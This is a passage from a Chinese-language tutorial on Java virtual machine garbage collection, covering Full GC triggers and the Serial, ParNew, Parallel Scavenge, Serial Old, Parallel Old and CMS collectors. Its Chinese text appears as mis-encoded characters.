æ­¤å¼ºçƒˆå»ºè®®èƒ½ä¸ä½¿ç”¨æ­¤æ–¹æ³•å°±ä¸è¦ä½¿ç”¨ï¼Œè®©è™šæ‹Ÿæœºè‡ªå·±å»ç®¡ç†å®ƒçš„å†…å­˜ï¼Œå¯é€šè¿‡ -XX:+ DisableExplicitGC æ¥ç¦æ­¢ RMI è°ƒç”¨ System.gc()ã€‚ è€å¹´ä»£ç©ºé—´ä¸è¶³è€å¹´ä»£ç©ºé—´ä¸è¶³çš„å¸¸è§åœºæ™¯ä¸ºå¤§å¯¹è±¡ç›´æ¥è¿›å…¥è€å¹´ä»£ã€é•¿æœŸå­˜æ´»çš„å¯¹è±¡è¿›å…¥è€å¹´ä»£ç­‰ï¼Œå½“æ‰§è¡Œ Full GC åç©ºé—´ä»ç„¶ä¸è¶³ï¼Œåˆ™æŠ›å‡ºå¦‚ä¸‹é”™è¯¯ï¼š Java.lang.OutOfMemoryError: Java heap spaceï¼Œä¸ºé¿å…ä»¥ä¸Šä¸¤ç§çŠ¶å†µå¼•èµ·çš„ Full GCï¼Œè°ƒä¼˜æ—¶åº”å°½é‡åšåˆ°è®©å¯¹è±¡åœ¨ Minor GC é˜¶æ®µè¢«å›æ”¶ã€è®©å¯¹è±¡åœ¨æ–°ç”Ÿä»£å¤šå­˜æ´»ä¸€æ®µæ—¶é—´åŠä¸è¦åˆ›å»ºè¿‡å¤§çš„å¯¹è±¡åŠæ•°ç»„ã€‚ ç©ºé—´åˆ†é…æ‹…ä¿å¤±è´¥åœ¨æ–°ç”Ÿä»£ä½¿ç”¨å¤åˆ¶ç®—æ³•çš„ Minor GCï¼Œéœ€è¦è€å¹´ä»£çš„å†…å­˜ç©ºé—´ä½œæ‹…ä¿ï¼Œå¦‚æœå‡ºç°äº† HandlePromotionFailure æ‹…ä¿å¤±è´¥ï¼Œåˆ™ä¼šè§¦å‘ Full GCã€‚ JDK 1.7 åŠä»¥å‰çš„æ°¸ä¹…ä»£ç©ºé—´ä¸è¶³åœ¨ JDK 1.7 åŠä»¥å‰ï¼ŒHotSpot è™šæ‹Ÿæœºä¸­çš„æ–¹æ³•åŒºæ˜¯ç”¨æ°¸ä¹…ä»£å®ç°çš„ï¼Œæ°¸ä¹…ä»£ä¸­å­˜æ”¾çš„ä¸ºä¸€äº›ç±»ä¿¡æ¯ã€é™æ€å˜é‡ã€å¸¸é‡ã€å¸¸é‡æ± ç­‰æ•°æ®ï¼Œå½“ç³»ç»Ÿä¸­è¦åŠ è½½çš„ç±»ã€åå°„çš„ç±»å’Œè°ƒç”¨çš„æ–¹æ³•è¾ƒå¤šæ—¶ï¼ŒPermanet Generation å¯èƒ½ä¼šè¢«å æ»¡ï¼Œåœ¨æœªé…ç½®ä¸ºé‡‡ç”¨ CMS GC çš„æƒ…å†µä¸‹ä¹Ÿä¼šæ‰§è¡Œ Full GCã€‚å¦‚æœç»è¿‡ Full GC ä»ç„¶å›æ”¶ä¸äº†ï¼Œé‚£ä¹ˆ JVM ä¼šæŠ›å‡ºé”™è¯¯ä¿¡æ¯ java.lang.OutOfMemoryError: PermGen spaceï¼Œä¸ºé¿å… Permanet Generation å æ»¡é€ æˆ Full GC ç°è±¡ï¼Œå¯é‡‡ç”¨çš„æ–¹æ³•ä¸ºå¢å¤§ Permanet Generation ç©ºé—´æˆ–è½¬ä¸ºä½¿ç”¨ CMS GCã€‚åœ¨ JDK 1.8 ä¸­ç”¨å…ƒç©ºé—´æ›¿æ¢äº†æ°¸ä¹…ä»£ä½œä¸ºæ–¹æ³•åŒºçš„å®ç°ï¼Œå…ƒç©ºé—´æ˜¯æœ¬åœ°å†…å­˜ï¼Œå› æ­¤å‡å°‘äº†ä¸€ç§ Full GC è§¦å‘çš„å¯èƒ½æ€§ã€‚ Java è™šæ‹Ÿæœºè§„èŒƒé‡Œï¼Œä½¿ç”¨æ–¹æ³•åŒºä½œä¸ºé»˜è®¤å®ç° JDK 1.7 åŠä»¥å‰ï¼ŒHotSpot è™šæ‹Ÿæœºä¸­çš„æ–¹æ³•åŒºä½¿ç”¨æ°¸ä¹…ä»£å®ç° JDK 1.8ï¼ŒHotSpot è™šæ‹Ÿæœºä¸­çš„æ–¹æ³•åŒºä½¿ç”¨å…ƒç©ºé—´å®ç° Concurrent Mode Failureæ‰§è¡Œ CMS GC çš„è¿‡ç¨‹ä¸­åŒæ—¶æœ‰å¯¹è±¡è¦æ”¾å…¥è€å¹´ä»£ï¼Œè€Œæ­¤æ—¶è€å¹´ä»£ç©ºé—´ä¸è¶³ï¼ˆæœ‰æ—¶å€™ç©ºé—´ä¸è¶³æ˜¯ç”±äº CMS GC æ‰§è¡Œæ—¶ï¼Œå½“å‰çš„æµ®åŠ¨åƒåœ¾è¿‡å¤šå¯¼è‡´æš‚æ—¶æ€§çš„ç©ºé—´ä¸è¶³è§¦å‘ Full GCï¼‰ï¼Œä¾¿ä¼šæŠ¥ Concurrent Mode Failure é”™è¯¯ï¼Œå¹¶è§¦å‘ Full GCã€‚ JVM åƒåœ¾æ”¶é›†å™¨å¦‚æœè¯´åƒåœ¾æ”¶é›†ç®—æ³•æ˜¯å†…å­˜å›æ”¶çš„æ–¹æ³•è®ºï¼Œé‚£ä¹ˆåƒåœ¾æ”¶é›†å™¨å°±æ˜¯å†…å­˜å›æ”¶çš„å…·ä½“å®ç°ã€‚Java è™šæ‹Ÿæœºè§„èŒƒä¸­å¯¹åƒåœ¾æ”¶é›†å™¨åº”è¯¥å¦‚ä½•å®ç°å¹¶æ²¡æœ‰ä»»ä½•è§„å®šï¼Œå› æ­¤ä¸åŒçš„å‚å•†ã€ä¸åŒç‰ˆæœ¬çš„è™šæ‹Ÿæœºæ‰€æä¾›çš„åƒåœ¾æ”¶é›†å™¨éƒ½å¯èƒ½ä¼šæœ‰å¾ˆå¤§å·®åˆ«ï¼Œå¹¶ä¸”ä¸€èˆ¬éƒ½ä¼šæä¾›å‚æ•°ä¾›ç”¨æˆ·æ ¹æ®è‡ªå·±çš„åº”ç”¨ç‰¹ç‚¹å’Œè¦æ±‚ç»„åˆå‡ºå„ä¸ªå¹´ä»£æ‰€ä½¿ç”¨çš„åƒåœ¾æ”¶é›†å™¨ã€‚ä¸‹é¢çš„å›¾ä¸­å±•ç¤ºäº† 7 ç§ä½œç”¨äºä¸åŒåˆ†ä»£çš„åƒåœ¾æ”¶é›†å™¨ï¼Œå¦‚æœä¸¤ä¸ªæ”¶é›†å™¨ä¹‹é—´å­˜åœ¨è¿çº¿ï¼Œå°±è¯´æ˜å®ƒä»¬å¯ä»¥æ­é…ä½¿ç”¨ã€‚è™šæ‹Ÿæœºæ‰€å¤„çš„åŒºåŸŸï¼Œåˆ™è¡¨ç¤ºå®ƒæ˜¯å±äºæ–°ç”Ÿä»£æ”¶é›†å™¨è¿˜æ˜¯è€å¹´ä»£æ”¶é›†å™¨ã€‚ æ¦‚å¿µç†è§£ååé‡ ååé‡å°±æ˜¯ CPU ç”¨äºè¿è¡Œç”¨æˆ·ä»£ç çš„æ—¶é—´ä¸ CPU æ€»æ¶ˆè€—æ—¶é—´çš„æ¯”å€¼ï¼Œå³ï¼šååé‡ = è¿è¡Œç”¨æˆ·ä»£ç æ—¶é—´ /ï¼ˆè¿è¡Œç”¨æˆ·ä»£ç æ—¶é—´ + åƒåœ¾æ”¶é›†æ—¶é—´ï¼‰ è™šæ‹Ÿæœºæ€»å…±è¿è¡Œäº† 100 åˆ†é’Ÿï¼Œå…¶ä¸­åƒåœ¾æ”¶é›†èŠ±æ‰ 1 åˆ†é’Ÿï¼Œé‚£ååé‡å°±æ˜¯ 99% å¹¶å‘å’Œå¹¶è¡Œ è¿™ä¸¤ä¸ªåè¯éƒ½æ˜¯å¹¶å‘ç¼–ç¨‹ä¸­çš„æ¦‚å¿µï¼Œåœ¨è°ˆè®ºåƒåœ¾æ”¶é›†å™¨çš„ä¸Šä¸‹æ–‡è¯­å¢ƒä¸­ï¼Œå®ƒä»¬çš„è§£é‡Šå¦‚ä¸‹ å¹¶è¡Œï¼ˆParallelï¼‰ï¼šæŒ‡å¤šæ¡åƒåœ¾æ”¶é›†çº¿ç¨‹å¹¶è¡Œå·¥ä½œï¼Œä½†æ­¤æ—¶ç”¨æˆ·çº¿ç¨‹ä»ç„¶å¤„äºç­‰å¾…çŠ¶æ€ å¹¶å‘ï¼ˆConcurrentï¼‰ï¼šæŒ‡ç”¨æˆ·çº¿ç¨‹ä¸åƒåœ¾æ”¶é›†çº¿ç¨‹åŒæ—¶æ‰§è¡Œï¼ˆä½†ä¸ä¸€å®šæ˜¯å¹¶è¡Œçš„ï¼Œå¯èƒ½ä¼šäº¤æ›¿æ‰§è¡Œï¼‰ï¼Œç”¨æˆ·ç¨‹åºåœ¨ç»§ç»­è¿è¡Œï¼Œè€Œåƒåœ¾æ”¶é›†ç¨‹åºè¿è¡Œäºå¦ä¸€ä¸ª CPU æ ¸ä¸Š Minor GC å’Œ Full GC æ–°ç”Ÿä»£ GCï¼ˆMinor GCï¼‰ï¼šæŒ‡å‘ç”Ÿåœ¨æ–°ç”Ÿä»£çš„åƒåœ¾æ”¶é›†åŠ¨ä½œï¼Œå› ä¸º Java å¯¹è±¡å¤§å¤šéƒ½å…·å¤‡æœç”Ÿå¤•ç­çš„ç‰¹æ€§ï¼Œæ‰€ä»¥ Minor GC éå¸¸é¢‘ç¹ï¼Œä¸€èˆ¬å›æ”¶é€Ÿåº¦ä¹Ÿæ¯”è¾ƒå¿« è€å¹´ä»£ GCï¼ˆFull GC / Major GCï¼‰ï¼šæŒ‡å‘ç”Ÿåœ¨è€å¹´ä»£çš„ GCï¼Œå‡ºç° Full GC çš„æ—¶å€™ï¼Œç»å¸¸ä¼šä¼´éšè‡³å°‘ä¸€æ¬¡çš„ Minor GCï¼ˆä½†éç»å¯¹çš„ï¼Œåœ¨ Parallel Scavenge æ”¶é›†å™¨çš„æ”¶é›†ç­–ç•¥é‡Œå°±æœ‰ç›´æ¥æ‰§è¡Œäº† Full GC çš„ç­–ç•¥é€‰æ‹©è¿‡ç¨‹ï¼‰ã€‚Full GC çš„é€Ÿåº¦ä¸€èˆ¬ä¼šæ¯” Minor GC æ…¢ 10 å€ä»¥ä¸Š æ–°ç”Ÿä»£æ”¶é›†å™¨Serial æ”¶é›†å™¨ Serial æ”¶é›†å™¨æ˜¯æœ€åŸºæœ¬ã€å‘å±•å†å²æœ€æ‚ ä¹…çš„æ”¶é›†å™¨ï¼Œæ›¾ç»ï¼ˆåœ¨ JDK 1.3.1 ä¹‹å‰ï¼‰æ˜¯è™šæ‹Ÿæœºæ–°ç”Ÿä»£æ”¶é›†çš„å”¯ä¸€é€‰æ‹©ã€‚ ç‰¹æ€§ï¼šè¿™ä¸ªæ”¶é›†å™¨æ˜¯ä¸€ä¸ªå•çº¿ç¨‹çš„æ”¶é›†å™¨ï¼Œä½†å®ƒçš„ â€œå•çº¿ç¨‹â€ çš„æ„ä¹‰å¹¶ä¸ä»…ä»…è¯´æ˜å®ƒåªä¼šä½¿ç”¨ä¸€ä¸ª CPU æˆ–ä¸€æ¡æ”¶é›†çº¿ç¨‹å»å®Œæˆåƒåœ¾æ”¶é›†å·¥ä½œï¼Œæ›´é‡è¦çš„æ˜¯åœ¨å®ƒè¿›è¡Œåƒåœ¾æ”¶é›†æ—¶ï¼Œå¿…é¡»æš‚åœå…¶ä»–æ‰€æœ‰çš„å·¥ä½œçº¿ç¨‹ï¼Œç›´åˆ°å®ƒæ”¶é›†ç»“æŸï¼Œå³ä¼šé€ æˆ â€œStop The Worldâ€ ç°è±¡ã€‚ åº”ç”¨åœºæ™¯ï¼šSerial æ”¶é›†å™¨æ˜¯è™šæ‹Ÿæœºè¿è¡Œåœ¨ Client æ¨¡å¼ä¸‹çš„é»˜è®¤æ–°ç”Ÿä»£æ”¶é›†å™¨ã€‚ ä¼˜åŠ¿ï¼šç®€å•è€Œé«˜æ•ˆï¼ˆä¸å…¶ä»–æ”¶é›†å™¨çš„å•çº¿ç¨‹æ¯”ï¼‰ï¼Œå¯¹äºé™å®šå•ä¸ª CPU çš„ç¯å¢ƒæ¥è¯´ï¼ŒSerial æ”¶é›†å™¨ç”±äºæ²¡æœ‰çº¿ç¨‹äº¤äº’çš„å¼€é”€ï¼Œä¸“å¿ƒåšåƒåœ¾æ”¶é›†è‡ªç„¶å¯ä»¥è·å¾—æœ€é«˜çš„å•çº¿ç¨‹æ”¶é›†æ•ˆç‡ã€‚ ParNew æ”¶é›†å™¨ ç‰¹æ€§ï¼šParNew æ”¶é›†å™¨å…¶å®å°±æ˜¯ Serial æ”¶é›†å™¨çš„å¤šçº¿ç¨‹ç‰ˆæœ¬ï¼Œé™¤äº†ä½¿ç”¨å¤šæ¡çº¿ç¨‹è¿›è¡Œåƒåœ¾æ”¶é›†ä¹‹å¤–ï¼Œå…¶ä½™è¡Œä¸ºåŒ…æ‹¬ Serial æ”¶é›†å™¨å¯ç”¨çš„æ‰€æœ‰æ§åˆ¶å‚æ•°ã€æ”¶é›†ç®—æ³•ã€Stop The Worldã€å¯¹è±¡åˆ†é…è§„åˆ™ã€å›æ”¶ç­–ç•¥ç­‰éƒ½ä¸ Serial æ”¶é›†å™¨å®Œå…¨ä¸€æ ·ï¼Œåœ¨å®ç°ä¸Šï¼Œè¿™ä¸¤ç§æ”¶é›†å™¨ä¹Ÿå…±ç”¨äº†ç›¸å½“å¤šçš„ä»£ç ã€‚ åº”ç”¨åœºæ™¯ï¼šParNew æ”¶é›†å™¨æ˜¯è®¸å¤šè¿è¡Œåœ¨ Server æ¨¡å¼ä¸‹çš„è™šæ‹Ÿæœºä¸­é¦–é€‰çš„æ–°ç”Ÿä»£æ”¶é›†å™¨ã€‚å¾ˆé‡è¦çš„åŸå› æ˜¯ï¼šé™¤äº† Serial æ”¶é›†å™¨å¤–ï¼Œç›®å‰åªæœ‰å®ƒèƒ½ä¸ CMS æ”¶é›†å™¨é…åˆå·¥ä½œã€‚åœ¨ JDK 1.5 æ—¶æœŸï¼ŒHotSpot æ¨å‡ºäº†ä¸€æ¬¾åœ¨å¼ºäº¤äº’åº”ç”¨ä¸­å‡ ä¹å¯è®¤ä¸ºæœ‰åˆ’æ—¶ä»£æ„ä¹‰çš„åƒåœ¾æ”¶é›†å™¨ - CMS æ”¶é›†å™¨ï¼Œè¿™æ¬¾æ”¶é›†å™¨æ˜¯ HotSpot è™šæ‹Ÿæœºä¸­ç¬¬ä¸€æ¬¾çœŸæ­£æ„ä¹‰ä¸Šçš„å¹¶å‘æ”¶é›†å™¨ï¼Œå®ƒç¬¬ä¸€æ¬¡å®ç°äº†è®©åƒåœ¾æ”¶é›†çº¿ç¨‹ä¸ç”¨æˆ·çº¿ç¨‹åŒæ—¶å·¥ä½œã€‚ä¸å¹¸çš„æ˜¯ï¼ŒCMS ä½œä¸ºè€å¹´ä»£çš„æ”¶é›†å™¨ï¼Œå´æ— æ³•ä¸ JDK 1.4.0 ä¸­å·²ç»å­˜åœ¨çš„æ–°ç”Ÿä»£æ”¶é›†å™¨ Parallel Scavenge é…åˆå·¥ä½œï¼Œæ‰€ä»¥åœ¨ JDK 1.5 ä¸­ä½¿ç”¨ CMS æ¥æ”¶é›†è€å¹´ä»£çš„æ—¶å€™ï¼Œæ–°ç”Ÿä»£åªèƒ½é€‰æ‹© ParNew æˆ–è€… Serial æ”¶é›†å™¨ä¸­çš„ä¸€ä¸ªã€‚ Serial æ”¶é›†å™¨ VS ParNew æ”¶é›†å™¨ï¼šParNew æ”¶é›†å™¨åœ¨å• CPU çš„ç¯å¢ƒä¸­ç»å¯¹ä¸ä¼šæœ‰æ¯” Serial æ”¶é›†å™¨æ›´å¥½çš„æ•ˆæœï¼Œç”šè‡³ç”±äºå­˜åœ¨çº¿ç¨‹äº¤äº’çš„å¼€é”€ï¼Œè¯¥æ”¶é›†å™¨åœ¨é€šè¿‡è¶…çº¿ç¨‹æŠ€æœ¯å®ç°çš„ä¸¤ä¸ª CPU çš„ç¯å¢ƒä¸­éƒ½ä¸èƒ½ç™¾åˆ†ä¹‹ç™¾åœ°ä¿è¯å¯ä»¥è¶…è¶Š Serial æ”¶é›†å™¨ã€‚ç„¶è€Œï¼Œéšç€å¯ä»¥ä½¿ç”¨çš„ CPU çš„æ•°é‡çš„å¢åŠ ï¼Œå®ƒå¯¹äº GC æ—¶ç³»ç»Ÿèµ„æºçš„æœ‰æ•ˆåˆ©ç”¨è¿˜æ˜¯å¾ˆæœ‰å¥½å¤„çš„ã€‚å®ƒé»˜è®¤å¼€å¯çš„æ”¶é›†çº¿ç¨‹æ•°ä¸ CPU çš„æ•°é‡ç›¸åŒï¼Œåœ¨ CPU éå¸¸å¤šçš„æƒ…å†µä¸‹å¯ä½¿ç”¨ -XX:ParallerGCThreads å‚æ•°è®¾ç½®ã€‚ Parallel Scavenge æ”¶é›†å™¨ç‰¹æ€§ï¼šParallel Scavenge æ”¶é›†å™¨æ˜¯ä¸€ä¸ªæ–°ç”Ÿä»£æ”¶é›†å™¨ï¼Œå®ƒä¹Ÿæ˜¯ä½¿ç”¨å¤åˆ¶ç®—æ³•çš„æ”¶é›†å™¨ï¼Œåˆæ˜¯å¹¶è¡Œçš„å¤šçº¿ç¨‹æ”¶é›†å™¨ã€‚ åº”ç”¨åœºæ™¯ï¼šåœé¡¿æ—¶é—´è¶ŠçŸ­å°±è¶Šé€‚åˆéœ€è¦ä¸ç”¨æˆ·äº¤äº’çš„ç¨‹åºï¼Œè‰¯å¥½çš„å“åº”é€Ÿåº¦èƒ½æå‡ç”¨æˆ·ä½“éªŒï¼Œè€Œé«˜ååé‡åˆ™å¯ä»¥é«˜æ•ˆç‡åœ°åˆ©ç”¨ CPU æ—¶é—´ï¼Œå°½å¿«å®Œæˆç¨‹åºçš„è¿ç®—ä»»åŠ¡ï¼Œä¸»è¦é€‚åˆåœ¨åå°è¿ç®—è€Œä¸éœ€è¦å¤ªå¤šäº¤äº’çš„ä»»åŠ¡ã€‚ Parallel Scavenge æ”¶é›†å™¨ ä¸ CMS æ”¶é›†å™¨ï¼šParallel Scavenge æ”¶é›†å™¨çš„ç‰¹ç‚¹æ˜¯å®ƒçš„å…³æ³¨ç‚¹ä¸å…¶ä»–æ”¶é›†å™¨ä¸åŒï¼ŒCMS ç­‰æ”¶é›†å™¨çš„å…³æ³¨ç‚¹æ˜¯å°½å¯èƒ½ç¼©çŸ­åƒåœ¾æ”¶é›†æ—¶ç”¨æˆ·çº¿ç¨‹çš„åœé¡¿æ—¶é—´ï¼Œè€Œ Parallel Scavenge æ”¶é›†å™¨çš„ç›®æ ‡æ˜¯è¾¾åˆ°ä¸€ä¸ªå¯æ§åˆ¶çš„ååé‡ï¼ˆThroughputï¼‰ã€‚ç”±äºä¸ååé‡å…³ç³»å¯†åˆ‡ï¼ŒParallel Scavenge æ”¶é›†å™¨ä¹Ÿç»å¸¸ç§°ä¸º â€œååé‡ä¼˜å…ˆâ€ æ”¶é›†å™¨ã€‚å¦å¤–å€¼å¾—æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼ŒParallel Scavenge æ”¶é›†å™¨æ— æ³•ä¸ CMS æ”¶é›†å™¨é…åˆä½¿ç”¨ï¼Œæ‰€ä»¥åœ¨ JDK 1.6 æ¨å‡º Parallel Old ä¹‹å‰ï¼Œå¦‚æœæ–°ç”Ÿä»£é€‰æ‹© Parallel Scavenge æ”¶é›†å™¨ï¼Œè€å¹´ä»£åªæœ‰ Serial Old æ”¶é›†å™¨èƒ½ä¸ä¹‹é…åˆä½¿ç”¨ã€‚ Parallel Scavenge æ”¶é›†å™¨ VS ParNew æ”¶é›†å™¨ï¼šParallel Scavenge æ”¶é›†å™¨ä¸ ParNew æ”¶é›†å™¨çš„ä¸€ä¸ªé‡è¦åŒºåˆ«æ˜¯ï¼Œå‰è€…å…·æœ‰ GC è‡ªé€‚åº”è°ƒèŠ‚ç­–ç•¥ç‰¹æ€§ã€‚Parallel Scavenge æ”¶é›†å™¨é™¤äº†ä¼šæ˜¾è€Œæ˜“è§åœ°æä¾›å¯ä»¥ç²¾ç¡®æ§åˆ¶ååé‡çš„å‚æ•°ï¼Œè¿˜æä¾›äº†ä¸€ä¸ªå‚æ•° -XX:+UseAdaptiveSizePolicyï¼Œè¿™æ˜¯ä¸€ä¸ªå¼€å…³å‚æ•°ï¼Œæ‰“å¼€å‚æ•°åå°±ä¸éœ€è¦æ‰‹å·¥æŒ‡å®šæ–°ç”Ÿä»£çš„å¤§å°ï¼ˆ-Xmnï¼‰ã€Eden å’Œ Survivor ç©ºé—´çš„æ¯”ä¾‹ï¼ˆ-XX:SurvivorRatioï¼‰ã€æ™‹å‡è€å¹´ä»£å¯¹è±¡å¹´é¾„ï¼ˆ-XX:PretenureSizeThresholdï¼‰ç­‰ç»†èŠ‚å‚æ•°äº†ï¼Œè™šæ‹Ÿæœºä¼šæ ¹æ®å½“å‰ç³»ç»Ÿçš„è¿è¡Œæƒ…å†µæ”¶é›†æ€§èƒ½ç›‘æ§ä¿¡æ¯ï¼ŒåŠ¨æ€è°ƒæ•´è¿™äº›å‚æ•°ä»¥æä¾›æœ€åˆé€‚çš„åœé¡¿æ—¶é—´æˆ–è€…æœ€å¤§çš„ååé‡ï¼Œè¿™ç§æ–¹å¼ç§°ä¸º GC è‡ªé€‚åº”è°ƒèŠ‚ç­–ç•¥ï¼ˆGC Ergonomicsï¼‰ã€‚ è€å¹´ä»£æ”¶é›†å™¨Serial Old æ”¶é›†å™¨ ç‰¹æ€§ï¼šSerial Old æ˜¯ Serial æ”¶é›†å™¨çš„è€å¹´ä»£ç‰ˆæœ¬ï¼Œå®ƒåŒæ ·æ˜¯ä¸€ä¸ªå•çº¿ç¨‹æ”¶é›†å™¨ï¼Œä½¿ç”¨â€ æ ‡è®° - æ•´ç†ç®—æ³•â€ã€‚ åº”ç”¨åœºæ™¯ï¼š Client æ¨¡å¼ä¸‹ï¼ŒSerial Old æ”¶é›†å™¨çš„ä¸»è¦æ„ä¹‰ä¹Ÿæ˜¯åœ¨äºç»™ Client æ¨¡å¼ä¸‹çš„è™šæ‹Ÿæœºä½¿ç”¨ã€‚ Server æ¨¡å¼ä¸‹ï¼Œä¸»è¦æœ‰ä¸¤å¤§ç”¨é€”ï¼šä¸€ç§ç”¨é€”æ˜¯åœ¨ JDK 1.5 ä»¥åŠä¹‹å‰çš„ç‰ˆæœ¬ä¸­ä¸ Parallel Scavenge æ”¶é›†å™¨æ­é…ä½¿ç”¨ï¼›å¦ä¸€ç§ç”¨é€”å°±æ˜¯ä½œä¸º CMS æ”¶é›†å™¨çš„åå¤‡é¢„æ¡ˆï¼Œåœ¨å¹¶å‘æ”¶é›†å‘ç”Ÿ Concurrent Mode Failure æ—¶ä½¿ç”¨ã€‚ Parallel Old æ”¶é›†å™¨ ç‰¹æ€§ï¼šParallel Old æ˜¯ Parallel Scavenge æ”¶é›†å™¨çš„è€å¹´ä»£ç‰ˆæœ¬ï¼Œä½¿ç”¨å¤šçº¿ç¨‹å’Œ â€œæ ‡è®° - æ•´ç†â€ ç®—æ³•ã€‚ åº”ç”¨åœºæ™¯ï¼šåœ¨æ³¨é‡ååé‡ä»¥åŠ CPU èµ„æºæ•æ„Ÿçš„åœºåˆï¼Œéƒ½å¯ä»¥ä¼˜å…ˆè€ƒè™‘ Parallel Scavenge åŠ  Parallel Old æ”¶é›†å™¨ã€‚ Parallel Old é…åˆ Parallel Scavengeï¼šParallel Old æ”¶é›†å™¨æ˜¯åœ¨ JDK 1.6 ä¸­æ‰å¼€å§‹æä¾›çš„ï¼Œåœ¨æ­¤ä¹‹å‰æ–°ç”Ÿä»£çš„ Parallel Scavenge æ”¶é›†å™¨ä¸€ç›´å¤„äºæ¯”è¾ƒå°´å°¬çš„çŠ¶æ€ã€‚å› ä¸ºå¦‚æœæ–°ç”Ÿä»£é€‰æ‹©äº† Parallel Scavenge æ”¶é›†å™¨ï¼Œè€å¹´ä»£é™¤äº† Serial Old æ”¶é›†å™¨å¤–åˆ«æ— é€‰æ‹©ï¼ˆParallel Scavenge æ”¶é›†å™¨æ— æ³•ä¸ CMS æ”¶é›†å™¨é…åˆä½¿ç”¨ï¼‰ã€‚ç”±äºè€å¹´ä»£ Serial Old æ”¶é›†å™¨åœ¨æœåŠ¡ç«¯åº”ç”¨æ€§èƒ½ä¸Šçš„ â€œæ‹–ç´¯â€ï¼Œä½¿ç”¨äº† Parallel Scavenge æ”¶é›†å™¨ä¹Ÿæœªå¿…èƒ½åœ¨æ•´ä½“åº”ç”¨ä¸Šè·å¾—ååé‡æœ€å¤§åŒ–çš„æ•ˆæœï¼Œç”±äºå•çº¿ç¨‹çš„è€å¹´ä»£æ”¶é›†å™¨ï¼ˆSerial Oldï¼‰æ— æ³•å……åˆ†åˆ©ç”¨æœåŠ¡å™¨å¤š CPU çš„å¤„ç†èƒ½åŠ›ï¼Œåœ¨è€å¹´ä»£å¾ˆå¤§è€Œä¸”ç¡¬ä»¶æ¯”è¾ƒé«˜çº§çš„ç¯å¢ƒä¸­ï¼Œè¿™ç§ç»„åˆçš„ååé‡ç”šè‡³è¿˜ä¸ä¸€å®šæœ‰ ParNew åŠ  CMS çš„ç»„åˆ â€œç»™åŠ›â€ã€‚ç›´åˆ° Parallel Old æ”¶é›†å™¨å‡ºç°åï¼Œâ€œååé‡ä¼˜å…ˆâ€ æ”¶é›†å™¨ç»ˆäºæœ‰äº†æ¯”è¾ƒåå‰¯å…¶å®çš„åº”ç”¨ç»„åˆã€‚ CMS æ”¶é›†å™¨ ç‰¹æ€§ï¼šCMSï¼ˆConcurrent Mark Sweepï¼‰æ”¶é›†å™¨æ˜¯ä¸€ç§ä»¥è·å–æœ€çŸ­å›æ”¶åœé¡¿æ—¶é—´ä¸ºç›®æ ‡çš„æ”¶é›†å™¨ã€‚ç›®å‰å¾ˆå¤§ä¸€éƒ¨åˆ†çš„ Java åº”ç”¨é›†ä¸­åœ¨äº’è”ç½‘ç«™æˆ–è€… B/S ç³»ç»Ÿçš„æœåŠ¡ç«¯ä¸Šï¼Œè¿™ç±»åº”ç”¨å°¤å…¶é‡è§†æœåŠ¡çš„å“åº”é€Ÿåº¦ï¼Œå¸Œæœ›ç³»ç»Ÿåœé¡¿æ—¶é—´æœ€çŸ­ï¼Œä»¥ç»™ç”¨æˆ·å¸¦æ¥è¾ƒå¥½çš„ä½“éªŒã€‚CMS æ”¶é›†å™¨å°±éå¸¸ç¬¦åˆè¿™ç±»åº”ç”¨çš„éœ€æ±‚ã€‚ è¿ä½œæµç¨‹ï¼šCMS æ”¶é›†å™¨æ˜¯åŸºäº â€œæ ‡è®° - æ¸…é™¤â€ ç®—æ³•å®ç°çš„ï¼Œå®ƒçš„è¿ä½œè¿‡ç¨‹ç›¸å¯¹äºå‰é¢å‡ ç§æ”¶é›†å™¨æ¥è¯´æ›´å¤æ‚ä¸€äº›ï¼Œæ•´ä¸ªè¿‡ç¨‹åˆ†ä¸ºä»¥ä¸‹ 4 ä¸ªæ­¥éª¤ã€‚ç”±äºåœ¨è€—æ—¶æœ€é•¿çš„å¹¶å‘æ ‡è®°å’Œå¹¶å‘æ¸…é™¤æ•´ä¸ªè¿‡ç¨‹ä¸­ï¼Œæ”¶é›†å™¨çº¿ç¨‹éƒ½å¯ä»¥ä¸ç”¨æˆ·çº¿ç¨‹ä¸€èµ·å·¥ä½œï¼Œæ‰€ä»¥ä»æ€»ä½“ä¸Šæ¥è¯´ï¼ŒCMS æ”¶é›†å™¨çš„å†…å­˜å›æ”¶è¿‡ç¨‹æ˜¯ä¸ç”¨æˆ·çº¿ç¨‹ä¸€èµ·å¹¶å‘æ‰§è¡Œçš„ã€‚ åˆå§‹æ ‡è®°ï¼ˆCMS initial markï¼‰ï¼šåˆå§‹æ ‡è®°ä»…ä»…åªæ˜¯æ ‡è®°ä¸€ä¸‹ GC Roots èƒ½ç›´æ¥å…³è”åˆ°çš„å¯¹è±¡ï¼Œé€Ÿåº¦å¾ˆå¿«ï¼Œéœ€è¦ â€œStop The Worldâ€ å¹¶å‘æ ‡è®°ï¼ˆCMS concurrent markï¼‰ï¼šå¹¶å‘æ ‡è®°é˜¶æ®µå°±æ˜¯è¿›è¡Œ GC Roots Tracing çš„è¿‡ç¨‹ é‡æ–°æ ‡è®°ï¼ˆCMS remarkï¼‰ï¼šé‡æ–°æ ‡è®°é˜¶æ®µæ˜¯ä¸ºäº†ä¿®æ­£å¹¶å‘æ ‡è®°æœŸé—´å› ç”¨æˆ·ç¨‹åºç»§ç»­è¿ä½œè€Œå¯¼è‡´æ ‡è®°äº§ç”Ÿå˜åŠ¨çš„é‚£ä¸€éƒ¨åˆ†å¯¹è±¡çš„æ ‡è®°è®°å½•ï¼Œè¿™ä¸ªé˜¶æ®µçš„åœé¡¿æ—¶é—´ä¸€èˆ¬ä¼šæ¯”åˆå§‹æ ‡è®°é˜¶æ®µç¨é•¿ä¸€äº›ï¼Œä½†è¿œæ¯”å¹¶å‘æ ‡è®°çš„æ—¶é—´çŸ­ï¼Œä»ç„¶éœ€è¦ â€œStop The Worldâ€ å¹¶å‘æ¸…é™¤ï¼ˆCMS concurrent sweepï¼‰ï¼šå¹¶å‘æ¸…é™¤é˜¶æ®µä¼šæ¸…é™¤å¯¹è±¡ ä¼˜ç‚¹CMS æ˜¯ä¸€æ¬¾ä¼˜ç§€çš„æ”¶é›†å™¨ï¼Œå®ƒçš„ä¸»è¦ä¼˜ç‚¹æ˜¯å¹¶å‘æ”¶é›†ã€åœé¡¿æ—¶é—´çŸ­ï¼Œå› æ­¤ CMS æ”¶é›†å™¨ä¹Ÿè¢«ç§°ä¸ºâ€ 